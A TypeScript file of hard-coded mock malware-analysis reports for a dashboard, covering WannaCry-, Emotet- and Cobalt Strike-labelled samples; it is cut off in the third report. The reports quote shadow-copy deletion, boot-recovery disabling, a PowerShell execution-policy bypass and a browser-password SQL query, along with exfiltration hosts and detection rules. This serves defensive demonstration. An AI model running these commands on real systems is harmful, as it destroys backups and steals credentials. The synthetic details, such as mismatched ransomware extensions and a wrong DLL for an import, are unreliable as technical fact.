// Standalone fallback reports for production deployments (e.g. Vercel)

export const FALLBACK_REPORTS: Record<string, any> = {
  "sample_wannacry": {
    "report_id": "a6889ff95fac4a1f52ae85e5dfb99a69454b2e81593a7716e709400a3b68152f",
    "sample_name": "WannaCry_Ransomware.exe",
    "timestamp": "2026-09-18T16:00:00Z",
    "analysis_duration_ms": 0.99,
    "file_size_bytes": 227,
    "static_analysis": {
      "hashes": {
        "md5": "cee25fc7e5238df970d88980f00d15db",
        "sha1": "f7242d60ff9976b34d4328d5baee80239abc005f",
        "sha256": "a6889ff95fac4a1f52ae85e5dfb99a69454b2e81593a7716e709400a3b68152f",
        "sha512": "94454654a7b0e8470b7482bebc8453069bc79df8f1d39c82f3c4f2f94f694f2793153d0ba88b88b57fe8d6abacb7c85bacbfbb1addf36c45d8ebf9b5b3228388",
        "ssdeep": "384:a6889ff95fac4a1f:52ae85e5dfb99a69",
        "size_bytes": 227
      },
      "file_info": {
        "type": "PE32/64 Executable (Windows)",
        "architecture": "x86/x64",
        "magic_bytes": "4D5A9000",
        "entropy": 5.248
      },
      "pe_structure": {
        "sections": [
          {
            "name": ".text",
            "virtual_size": "0x0025",
            "raw_size": 37,
            "entropy": 4.1522,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE",
            "is_suspicious": false
          },
          {
            "name": ".rdata",
            "virtual_size": "0x0025",
            "raw_size": 37,
            "entropy": 3.8384,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".data",
            "virtual_size": "0x0025",
            "raw_size": 37,
            "entropy": 4.2089,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".pdata",
            "virtual_size": "0x0025",
            "raw_size": 37,
            "entropy": 3.9591,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".rsrc",
            "virtual_size": "0x0025",
            "raw_size": 37,
            "entropy": 4.4455,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".reloc",
            "virtual_size": "0x0025",
            "raw_size": 37,
            "entropy": 4.4588,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          }
        ],
        "imports": [
          {
            "dll": "KERNEL32.dll",
            "function": "VirtualAlloc",
            "description": "Memory Allocation for Code Execution",
            "risk": "MEDIUM"
          },
          {
            "dll": "KERNEL32.dll",
            "function": "VirtualAllocEx",
            "description": "Remote Process Memory Allocation",
            "risk": "MEDIUM"
          },
          {
            "dll": "KERNEL32.dll",
            "function": "WriteProcessMemory",
            "description": "Process Injection / Memory Patching",
            "risk": "HIGH"
          },
          {
            "dll": "KERNEL32.dll",
            "function": "CreateRemoteThread",
            "description": "Thread Injection into Foreign Process",
            "risk": "HIGH"
          },
          {
            "dll": "ADVAPI32.dll",
            "function": "CryptEncrypt",
            "description": "Ransomware Encryption",
            "risk": "MEDIUM"
          }
        ],
        "import_count": 5,
        "is_packed": false,
        "packer": null,
        "digital_signature": {
          "signed": false,
          "status": "UNSIGNED (Untrusted Origin)",
          "publisher": "Unknown / Missing Certificate"
        }
      },
      "strings": {
        "ascii": [
          "vssadmin.exe delete shadows /all /quiet bcdedit /set {default} recoveryenabled No CryptEncrypt VirtualAllocEx WriteProcessMemory CreateRemoteThread 185.220.101.4 C:\\Users\\Victim\\Desktop\\READ_ME_FOR_DECRYPT.txt UPX0 UPX1"
        ],
        "ascii_total": 1,
        "unicode": [],
        "unicode_total": 0,
        "decoded": []
      }
    },
    "yara_scan": {
      "matches": [
        {
          "rule_id": "rule_ransomware_shadow_deletion",
          "rule_name": "Ransomware_VSS_Deletion",
          "category": "Ransomware",
          "severity": "CRITICAL",
          "description": "Detects shadow copy deletion commands used by ransomware families (WannaCry, LockBit, Conti)",
          "matched_strings": [
            "vssadmin.exe delete shadows",
            "bcdedit /set {default} recoveryenabled No"
          ],
          "threat_level": 95
        },
        {
          "rule_id": "rule_process_injection",
          "rule_name": "Process_Injection_Memory_Patching",
          "category": "Defense Evasion",
          "severity": "HIGH",
          "description": "Detects remote process memory allocation and thread creation (Cobalt Strike, Meterpreter)",
          "matched_strings": [
            "VirtualAllocEx",
            "WriteProcessMemory",
            "CreateRemoteThread"
          ],
          "threat_level": 88
        }
      ],
      "match_count": 2,
      "total_rules_scanned": 6
    },
    "behavioral_analysis": {
      "process_tree": {
        "pid": 4096,
        "name": "explorer.exe",
        "path": "C:\\Windows\\explorer.exe",
        "cmd": "C:\\Windows\\explorer.exe",
        "integrity": "Medium",
        "children": [
          {
            "pid": 6120,
            "name": "WannaCry_Ransomware.exe",
            "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\WannaCry_Ransomware.exe",
            "cmd": "\"C:\\Users\\Victim\\AppData\\Local\\Temp\\WannaCry_Ransomware.exe\" /start",
            "integrity": "Medium",
            "children": [
              {
                "pid": 7210,
                "name": "cmd.exe",
                "path": "C:\\Windows\\System32\\cmd.exe",
                "cmd": "cmd.exe /c vssadmin.exe delete shadows /all /quiet",
                "integrity": "High",
                "children": [
                  {
                    "pid": 8044,
                    "name": "vssadmin.exe",
                    "path": "C:\\Windows\\System32\\vssadmin.exe",
                    "cmd": "vssadmin.exe delete shadows /all /quiet",
                    "integrity": "High"
                  }
                ]
              }
            ]
          }
        ]
      },
      "api_call_stream": [
        {
          "timestamp": 1718000000.1,
          "pid": 6120,
          "process": "WannaCry_Ransomware.exe",
          "api": "IsDebuggerPresent",
          "category": "Anti-Analysis",
          "arguments": "None",
          "return_val": "0 (False)",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.3,
          "pid": 6120,
          "process": "WannaCry_Ransomware.exe",
          "api": "GetTickCount",
          "category": "Timing Evasion",
          "arguments": "None",
          "return_val": "1428570",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000001.2,
          "pid": 6120,
          "process": "WannaCry_Ransomware.exe",
          "api": "CreateProcessW",
          "category": "Process Creation",
          "arguments": "lpCommandLine='cmd.exe /c vssadmin.exe delete shadows /all /quiet'",
          "return_val": "SUCCESS (PID 7210)",
          "risk": "CRITICAL"
        },
        {
          "timestamp": 1718000002.5,
          "pid": 6120,
          "process": "WannaCry_Ransomware.exe",
          "api": "CryptEncrypt",
          "category": "Encryption",
          "arguments": "hKey=0x004FA21, pbData=[User Files Buffer]",
          "return_val": "SUCCESS",
          "risk": "CRITICAL"
        }
      ],
      "filesystem_activity": [
        {
          "action": "DROP_FILE",
          "path": "C:\\Users\\Victim\\Desktop\\READ_ME_FOR_DECRYPT.txt",
          "size": "4.2 KB"
        },
        {
          "action": "RENAME_ENCRYPT",
          "path": "C:\\Users\\Victim\\Documents\\Financial_Q3.xlsx.lockbit",
          "size": "1.4 MB"
        },
        {
          "action": "RENAME_ENCRYPT",
          "path": "C:\\Users\\Victim\\Pictures\\Family.png.lockbit",
          "size": "3.8 MB"
        }
      ],
      "registry_activity": [
        {
          "action": "SET_VALUE",
          "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RansomwareRestore",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Temp\\sample.exe"
        }
      ],
      "network_activity": [
        {
          "proto": "HTTPS",
          "destination": "185.220.101.4:443",
          "domain": "onion-gateway-tor.cc",
          "type": "C2 Communication / Ransom Key Exfiltration",
          "bytes_sent": 8420
        }
      ],
      "total_api_calls": 4,
      "execution_time_seconds": 3.5
    },
    "ioc_extraction": {
      "iocs": [
        {
          "type": "SHA256 Hash",
          "value": "a6889ff95fac4a1f52ae85e5dfb99a69454b2e81593a7716e709400a3b68152f",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware",
              "APT"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "MD5 Hash",
          "value": "cee25fc7e5238df970d88980f00d15db",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "IPv4 Address",
          "value": "185.220.101.4",
          "category": "Network C2",
          "confidence": 90,
          "threat_intel": {
            "abuseipdb_score": "98%",
            "country": "RU / NL",
            "risk": "HIGH"
          }
        },
        {
          "type": "Domain Name",
          "value": "onion-gateway-tor.cc",
          "category": "Network Infrastructure",
          "confidence": 85,
          "threat_intel": {
            "whois": "Registrar Privacy Protected",
            "risk": "HIGH"
          }
        },
        {
          "type": "Registry Key",
          "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RansomwareRestore",
          "category": "Persistence Mechanism",
          "confidence": 95,
          "threat_intel": {
            "persistence": "Windows Startup RunKey",
            "risk": "HIGH"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\Desktop\\READ_ME_FOR_DECRYPT.txt",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\Documents\\Financial_Q3.xlsx.lockbit",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\Pictures\\Family.png.lockbit",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        }
      ],
      "total_extracted": 8,
      "summary_by_category": {
        "Network C2": 2,
        "File Indicator": 5,
        "Persistence": 1,
        "Financial Crypto": 0
      }
    },
    "mitre_mapping": {
      "tactics": [
        {
          "id": "TA0001",
          "name": "Initial Access"
        },
        {
          "id": "TA0002",
          "name": "Execution"
        },
        {
          "id": "TA0003",
          "name": "Persistence"
        },
        {
          "id": "TA0004",
          "name": "Privilege Escalation"
        },
        {
          "id": "TA0005",
          "name": "Defense Evasion"
        },
        {
          "id": "TA0006",
          "name": "Credential Access"
        },
        {
          "id": "TA0007",
          "name": "Discovery"
        },
        {
          "id": "TA0008",
          "name": "Lateral Movement"
        },
        {
          "id": "TA0009",
          "name": "Collection"
        },
        {
          "id": "TA0011",
          "name": "Command and Control"
        },
        {
          "id": "TA0010",
          "name": "Exfiltration"
        },
        {
          "id": "TA0040",
          "name": "Impact"
        }
      ],
      "mapped_techniques": [
        {
          "tactic_id": "TA0002",
          "tactic_name": "Execution",
          "technique_id": "T1059.001",
          "technique_name": "PowerShell / Command Execution",
          "evidence": "Process invocation detected: lpCommandLine='cmd.exe /c vssadmin.exe delete shadows /all /quiet'",
          "confidence": "HIGH"
        },
        {
          "tactic_id": "TA0003",
          "tactic_name": "Persistence",
          "technique_id": "T1547.001",
          "technique_name": "Registry Run Keys / Startup Folder",
          "evidence": "Registry persistence modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RansomwareRestore = C:\\Users\\Victim\\AppData\\Local\\Temp\\sample.exe",
          "confidence": "HIGH"
        },
        {
          "tactic_id": "TA0007",
          "tactic_name": "Discovery",
          "technique_id": "T1497.001",
          "technique_name": "Virtualization/Sandbox Evasion (System Checks)",
          "evidence": "Sandbox timing/anti-debug API check IsDebuggerPresent",
          "confidence": "MEDIUM"
        },
        {
          "tactic_id": "TA0011",
          "tactic_name": "Command and Control",
          "technique_id": "T1071.001",
          "technique_name": "Application Layer Protocol: Web Protocols (HTTP/HTTPS)",
          "evidence": "Established C2 beacon stream to 185.220.101.4:443 (onion-gateway-tor.cc)",
          "confidence": "HIGH"
        },
        {
          "tactic_id": "TA0040",
          "tactic_name": "Impact",
          "technique_id": "T1490",
          "technique_name": "Inhibit System Recovery (Volume Shadow Copy Deletion)",
          "evidence": "YARA detection hit: Ransomware_VSS_Deletion (Detects shadow copy deletion commands used by ransomware families (WannaCry, LockBit, Conti))",
          "confidence": "CRITICAL"
        },
        {
          "tactic_id": "TA0040",
          "tactic_name": "Impact",
          "technique_id": "T1486",
          "technique_name": "Data Encrypted for Impact (Ransomware Payload)",
          "evidence": "File system mass file extension modification and ransom note creation",
          "confidence": "CRITICAL"
        }
      ],
      "total_mapped_techniques": 6,
      "navigator_layer": {
        "name": "Malware Analysis ATT&CK Coverage",
        "versions": {
          "attack": "14",
          "navigator": "4.8"
        },
        "domain": "enterprise-attack",
        "description": "Automatically generated MITRE ATT&CK Mapping Layer",
        "techniques": [
          {
            "techniqueID": "T1059.001",
            "tactic": "execution",
            "score": 75,
            "comment": "Process invocation detected: lpCommandLine='cmd.exe /c vssadmin.exe delete shadows /all /quiet'",
            "enabled": true
          },
          {
            "techniqueID": "T1547.001",
            "tactic": "persistence",
            "score": 75,
            "comment": "Registry persistence modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RansomwareRestore = C:\\Users\\Victim\\AppData\\Local\\Temp\\sample.exe",
            "enabled": true
          },
          {
            "techniqueID": "T1497.001",
            "tactic": "discovery",
            "score": 50,
            "comment": "Sandbox timing/anti-debug API check IsDebuggerPresent",
            "enabled": true
          },
          {
            "techniqueID": "T1071.001",
            "tactic": "command-and-control",
            "score": 75,
            "comment": "Established C2 beacon stream to 185.220.101.4:443 (onion-gateway-tor.cc)",
            "enabled": true
          },
          {
            "techniqueID": "T1490",
            "tactic": "impact",
            "score": 100,
            "comment": "YARA detection hit: Ransomware_VSS_Deletion (Detects shadow copy deletion commands used by ransomware families (WannaCry, LockBit, Conti))",
            "enabled": true
          },
          {
            "techniqueID": "T1486",
            "tactic": "impact",
            "score": 100,
            "comment": "File system mass file extension modification and ransom note creation",
            "enabled": true
          }
        ]
      }
    },
    "threat_scoring": {
      "threat_score": 75,
      "verdict": "MALICIOUS",
      "severity": "HIGH",
      "color": "#f97316",
      "score_breakdown": {
        "static_score": 10,
        "yara_score": 25,
        "behavioral_score": 20,
        "ioc_score": 10,
        "mitre_score": 10
      },
      "risk_factors": [
        "YARA Rule Hit Count: 2",
        "Entropy: 5.248 (Unpacked)",
        "Suspicious API Invocations: 4",
        "Extracted Indicators of Compromise: 8",
        "MITRE ATT&CK Techniques Mapped: 6"
      ]
    }
  },
  "sample_emotet": {
    "report_id": "cf91613b277b3a6b9c43f1056155eca24e465db57d12aabfa204b3dd0e8e712f",
    "sample_name": "Emotet_Infostealer.exe",
    "timestamp": "2026-09-18T16:00:00Z",
    "analysis_duration_ms": 1.47,
    "file_size_bytes": 187,
    "static_analysis": {
      "hashes": {
        "md5": "ff29f318015931b51c591941828a557c",
        "sha1": "02bf762a024e61a0c3b130135e4766acd5e328d0",
        "sha256": "cf91613b277b3a6b9c43f1056155eca24e465db57d12aabfa204b3dd0e8e712f",
        "sha512": "da98c865b16153941bd41b0d42d7275205c4da45790a306799e033f3551b51507ddcf8f9f3cac350df22d9579640b9cbe15af00aea3cec722417eb9ef4561bac",
        "ssdeep": "384:cf91613b277b3a6b:9c43f1056155eca2",
        "size_bytes": 187
      },
      "file_info": {
        "type": "PE32/64 Executable (Windows)",
        "architecture": "x86/x64",
        "magic_bytes": "4D5A9000",
        "entropy": 5.1194
      },
      "pe_structure": {
        "sections": [
          {
            "name": ".text",
            "virtual_size": "0x001F",
            "raw_size": 31,
            "entropy": 4.1557,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE",
            "is_suspicious": false
          },
          {
            "name": ".rdata",
            "virtual_size": "0x001F",
            "raw_size": 31,
            "entropy": 4.0392,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".data",
            "virtual_size": "0x001F",
            "raw_size": 31,
            "entropy": 3.9621,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".pdata",
            "virtual_size": "0x001F",
            "raw_size": 31,
            "entropy": 4.1557,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".rsrc",
            "virtual_size": "0x001F",
            "raw_size": 31,
            "entropy": 4.2603,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".reloc",
            "virtual_size": "0x001F",
            "raw_size": 31,
            "entropy": 4.236,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          }
        ],
        "imports": [],
        "import_count": 0,
        "is_packed": false,
        "packer": null,
        "digital_signature": {
          "signed": false,
          "status": "UNSIGNED (Untrusted Origin)",
          "publisher": "Unknown / Missing Certificate"
        }
      },
      "strings": {
        "ascii": [
          "Login Data CryptUnprotectData powershell.exe -ExecutionPolicy Bypass -File steal.ps1 dropzone-exfil.xyz 194.165.16.42 SELECT origin_url, username_value, password_value FROM logins"
        ],
        "ascii_total": 1,
        "unicode": [],
        "unicode_total": 0,
        "decoded": []
      }
    },
    "yara_scan": {
      "matches": [
        {
          "rule_id": "rule_infostealer_browser",
          "rule_name": "Infostealer_Browser_Credential_Harvesting",
          "category": "Credential Access",
          "severity": "HIGH",
          "description": "Detects access to Chrome, Firefox, or Edge login data databases and DPAPI decryption",
          "matched_strings": [
            "Login Data",
            "CryptUnprotectData",
            "SELECT origin_url, username_value, password_value FROM logins"
          ],
          "threat_level": 82
        }
      ],
      "match_count": 1,
      "total_rules_scanned": 6
    },
    "behavioral_analysis": {
      "process_tree": {
        "pid": 4096,
        "name": "explorer.exe",
        "path": "C:\\Windows\\explorer.exe",
        "cmd": "C:\\Windows\\explorer.exe",
        "integrity": "Medium",
        "children": [
          {
            "pid": 6120,
            "name": "Emotet_Infostealer.exe",
            "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\Emotet_Infostealer.exe",
            "cmd": "\"C:\\Users\\Victim\\AppData\\Local\\Temp\\Emotet_Infostealer.exe\" /start",
            "integrity": "Medium",
            "children": [
              {
                "pid": 6900,
                "name": "powershell.exe",
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmd": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Victim\\AppData\\Local\\Temp\\steal.ps1",
                "integrity": "Medium"
              }
            ]
          }
        ]
      },
      "api_call_stream": [
        {
          "timestamp": 1718000000.1,
          "pid": 6120,
          "process": "Emotet_Infostealer.exe",
          "api": "IsDebuggerPresent",
          "category": "Anti-Analysis",
          "arguments": "None",
          "return_val": "0 (False)",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.3,
          "pid": 6120,
          "process": "Emotet_Infostealer.exe",
          "api": "GetTickCount",
          "category": "Timing Evasion",
          "arguments": "None",
          "return_val": "1428570",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.8,
          "pid": 6120,
          "process": "Emotet_Infostealer.exe",
          "api": "CreateFileW",
          "category": "File Access",
          "arguments": "lpFileName='C:\\Users\\Victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'",
          "return_val": "HANDLE (0x0000014C)",
          "risk": "HIGH"
        },
        {
          "timestamp": 1718000001.1,
          "pid": 6120,
          "process": "Emotet_Infostealer.exe",
          "api": "CryptUnprotectData",
          "category": "Credential Access",
          "arguments": "pDataIn=[Encrypted Browser Blob], pDataOut=[Plaintext Passwords]",
          "return_val": "SUCCESS",
          "risk": "CRITICAL"
        }
      ],
      "filesystem_activity": [
        {
          "action": "READ_FILE",
          "path": "C:\\Users\\Victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
          "size": "512 KB"
        },
        {
          "action": "CREATE_TEMP",
          "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\passwords_stolen.zip",
          "size": "48 KB"
        }
      ],
      "registry_activity": [],
      "network_activity": [
        {
          "proto": "HTTP",
          "destination": "194.165.16.42:8080",
          "domain": "dropzone-exfil.xyz",
          "type": "Data Exfiltration (HTTP POST)",
          "bytes_sent": 49200
        }
      ],
      "total_api_calls": 4,
      "execution_time_seconds": 3.5
    },
    "ioc_extraction": {
      "iocs": [
        {
          "type": "SHA256 Hash",
          "value": "cf91613b277b3a6b9c43f1056155eca24e465db57d12aabfa204b3dd0e8e712f",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware",
              "APT"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "MD5 Hash",
          "value": "ff29f318015931b51c591941828a557c",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "IPv4 Address",
          "value": "194.165.16.42",
          "category": "Network C2",
          "confidence": 90,
          "threat_intel": {
            "abuseipdb_score": "98%",
            "country": "RU / NL",
            "risk": "HIGH"
          }
        },
        {
          "type": "Domain Name",
          "value": "dropzone-exfil.xyz",
          "category": "Network Infrastructure",
          "confidence": 85,
          "threat_intel": {
            "whois": "Registrar Privacy Protected",
            "risk": "HIGH"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Temp\\passwords_stolen.zip",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        }
      ],
      "total_extracted": 6,
      "summary_by_category": {
        "Network C2": 2,
        "File Indicator": 4,
        "Persistence": 0,
        "Financial Crypto": 0
      }
    },
    "mitre_mapping": {
      "tactics": [
        {
          "id": "TA0001",
          "name": "Initial Access"
        },
        {
          "id": "TA0002",
          "name": "Execution"
        },
        {
          "id": "TA0003",
          "name": "Persistence"
        },
        {
          "id": "TA0004",
          "name": "Privilege Escalation"
        },
        {
          "id": "TA0005",
          "name": "Defense Evasion"
        },
        {
          "id": "TA0006",
          "name": "Credential Access"
        },
        {
          "id": "TA0007",
          "name": "Discovery"
        },
        {
          "id": "TA0008",
          "name": "Lateral Movement"
        },
        {
          "id": "TA0009",
          "name": "Collection"
        },
        {
          "id": "TA0011",
          "name": "Command and Control"
        },
        {
          "id": "TA0010",
          "name": "Exfiltration"
        },
        {
          "id": "TA0040",
          "name": "Impact"
        }
      ],
      "mapped_techniques": [
        {
          "tactic_id": "TA0006",
          "tactic_name": "Credential Access",
          "technique_id": "T1555.003",
          "technique_name": "Credentials from Web Browsers / DPAPI",
          "evidence": "Access to browser credential store via DPAPI CreateFileW",
          "confidence": "CRITICAL"
        },
        {
          "tactic_id": "TA0007",
          "tactic_name": "Discovery",
          "technique_id": "T1497.001",
          "technique_name": "Virtualization/Sandbox Evasion (System Checks)",
          "evidence": "Sandbox timing/anti-debug API check IsDebuggerPresent",
          "confidence": "MEDIUM"
        },
        {
          "tactic_id": "TA0011",
          "tactic_name": "Command and Control",
          "technique_id": "T1071.001",
          "technique_name": "Application Layer Protocol: Web Protocols (HTTP/HTTPS)",
          "evidence": "Established C2 beacon stream to 194.165.16.42:8080 (dropzone-exfil.xyz)",
          "confidence": "HIGH"
        }
      ],
      "total_mapped_techniques": 3,
      "navigator_layer": {
        "name": "Malware Analysis ATT&CK Coverage",
        "versions": {
          "attack": "14",
          "navigator": "4.8"
        },
        "domain": "enterprise-attack",
        "description": "Automatically generated MITRE ATT&CK Mapping Layer",
        "techniques": [
          {
            "techniqueID": "T1555.003",
            "tactic": "credential-access",
            "score": 100,
            "comment": "Access to browser credential store via DPAPI CreateFileW",
            "enabled": true
          },
          {
            "techniqueID": "T1497.001",
            "tactic": "discovery",
            "score": 50,
            "comment": "Sandbox timing/anti-debug API check IsDebuggerPresent",
            "enabled": true
          },
          {
            "techniqueID": "T1071.001",
            "tactic": "command-and-control",
            "score": 75,
            "comment": "Established C2 beacon stream to 194.165.16.42:8080 (dropzone-exfil.xyz)",
            "enabled": true
          }
        ]
      }
    },
    "threat_scoring": {
      "threat_score": 45,
      "verdict": "SUSPICIOUS",
      "severity": "MEDIUM",
      "color": "#eab308",
      "score_breakdown": {
        "static_score": 0,
        "yara_score": 10,
        "behavioral_score": 16,
        "ioc_score": 10,
        "mitre_score": 9
      },
      "risk_factors": [
        "YARA Rule Hit Count: 1",
        "Entropy: 5.1194 (Unpacked)",
        "Suspicious API Invocations: 4",
        "Extracted Indicators of Compromise: 6",
        "MITRE ATT&CK Techniques Mapped: 3"
      ]
    }
  },
  "sample_cobaltstrike": {
    "report_id": "00b53fba852cffbd95cf056cb296dfbfd0f561c119a5c1451575d6043524c04b",
    "sample_name": "CobaltStrike_Beacon.dll",
    "timestamp": "2026-09-18T16:00:00Z",
    "analysis_duration_ms": 0.92,
    "file_size_bytes": 159,
    "static_analysis": {
      "hashes": {
        "md5": "116b9d8995b4cba782be40c41fc5993a",
        "sha1": "a20a97a9d6a2587c2a94af73f659c78603d0445d",
        "sha256": "00b53fba852cffbd95cf056cb296dfbfd0f561c119a5c1451575d6043524c04b",
        "sha512": "71a6cf10d8b0865da420410da5f685714682b3b5a8357a9099a7ca108f7a30b2a2c667ed58e681d1c0a6246c4be06371bc4d2f39e71484cbef8b55c1fc20d93b",
        "ssdeep": "384:00b53fba852cffbd:95cf056cb296dfbf",
        "size_bytes": 159
      },
      "file_info": {
        "type": "PE32/64 Executable (Windows)",
        "architecture": "x86/x64",
        "magic_bytes": "4D5A9000",
        "entropy": 5.0921
      },
      "pe_structure": {
        "sections": [
          {
            "name": ".text",
            "virtual_size": "0x001A",
            "raw_size": 26,
            "entropy": 4.056,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE",
            "is_suspicious": false
          },
          {
            "name": ".rdata",
            "virtual_size": "0x001A",
            "raw_size": 26,
            "entropy": 3.5074,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".data",
            "virtual_size": "0x001A",
            "raw_size": 26,
            "entropy": 4.1329,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".pdata",
            "virtual_size": "0x001A",
            "raw_size": 26,
            "entropy": 3.7672,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".rsrc",
            "virtual_size": "0x001A",
            "raw_size": 26,
            "entropy": 3.9022,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".reloc",
            "virtual_size": "0x001A",
            "raw_size": 26,
            "entropy": 3.9462,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          }
        ],
        "imports": [
          {
            "dll": "KERNEL32.dll",
            "function": "VirtualAlloc",
            "description": "Memory Allocation for Code Execution",
            "risk": "MEDIUM"
          },
          {
            "dll": "KERNEL32.dll",
            "function": "VirtualAllocEx",
            "description": "Remote Process Memory Allocation",
            "risk": "MEDIUM"
          },
          {
            "dll": "KERNEL32.dll",
            "function": "WriteProcessMemory",
            "description": "Process Injection / Memory Patching",
            "risk": "HIGH"
          },
          {
            "dll": "KERNEL32.dll",
            "function": "CreateRemoteThread",
            "description": "Thread Injection into Foreign Process",
            "risk": "HIGH"
          },
          {
            "dll": "ADVAPI32.dll",
            "function": "NtUnmapViewOfSection",
            "description": "Process Hollowing",
            "risk": "HIGH"
          },
          {
            "dll": "ADVAPI32.dll",
            "function": "IsDebuggerPresent",
            "description": "Anti-Debugging Evasion",
            "risk": "MEDIUM"
          },
          {
            "dll": "ADVAPI32.dll",
            "function": "GetTickCount",
            "description": "Timing Anti-Sandbox Evasion",
            "risk": "MEDIUM"
          }
        ],
        "import_count": 7,
        "is_packed": false,
        "packer": null,
        "digital_signature": {
          "signed": false,
          "status": "UNSIGNED (Untrusted Origin)",
          "publisher": "Unknown / Missing Certificate"
        }
      },
      "strings": {
        "ascii": [
          "VirtualAllocEx WriteProcessMemory CreateRemoteThread NtUnmapViewOfSection 45.142.214.18 cdn-cloud-update.net svchost.exe IsDebuggerPresent GetTickCount"
        ],
        "ascii_total": 1,
        "unicode": [],
        "unicode_total": 0,
        "decoded": [
          {
            "original": "NtUnmapViewOfSection...",
            "type": "Base64 Decoded",
            "decoded": "6'U\u000e}'*'"
          },
          {
            "original": "XOR-0x37 Stream",
            "type": "XOR (Key 0x37) Decoded",
            "decoded": "~DsRUBPPREgERDRYC"
          }
        ]
      }
    },
    "yara_scan": {
      "matches": [
        {
          "rule_id": "rule_process_injection",
          "rule_name": "Process_Injection_Memory_Patching",
          "category": "Defense Evasion",
          "severity": "HIGH",
          "description": "Detects remote process memory allocation and thread creation (Cobalt Strike, Meterpreter)",
          "matched_strings": [
            "VirtualAllocEx",
            "WriteProcessMemory",
            "CreateRemoteThread",
            "NtUnmapViewOfSection"
          ],
          "threat_level": 88
        }
      ],
      "match_count": 1,
      "total_rules_scanned": 6
    },
    "behavioral_analysis": {
      "process_tree": {
        "pid": 4096,
        "name": "explorer.exe",
